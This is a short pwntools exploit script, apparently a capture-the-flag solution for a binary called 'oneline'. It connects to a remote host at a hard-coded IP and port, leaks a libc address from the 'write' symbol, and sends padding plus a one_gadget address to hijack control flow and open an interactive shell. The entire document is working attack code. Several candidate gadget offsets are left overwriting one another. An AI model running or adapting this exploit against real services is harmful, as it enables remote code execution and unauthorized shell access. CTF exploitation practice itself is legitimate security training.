from pwn import *


binpath = './oneline'
context.binary = binpath
context.terminal = ['tmux', 'split-w', '-h']


elf = ELF(binpath)
libc = elf.libc


gdbscript = '''
pwn
# main
# b *0x55555555486d
b *0x5555555548d7
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath)
io = remote('153.120.129.186', 10000)


io.recvuntil('>> ')


io.sendline()

data = io.recvuntil('!\n')
data = data[data.rfind('@'):data.rfind('O')]
addr_write = u64(data[data.rfind('@'):data.rfind('O')].ljust(8, '\x00'))
addr_libc = addr_write - libc.symbols['write']
print hex(addr_libc)

addr_one_gadget = addr_libc + 0x4f2c5
addr_one_gadget = addr_libc + 0x4f322
addr_one_gadget = addr_libc + 0x10a38c

payload = 'A' * 0x20
payload += p64(addr_one_gadget)

io.send(payload)

io.interactive()
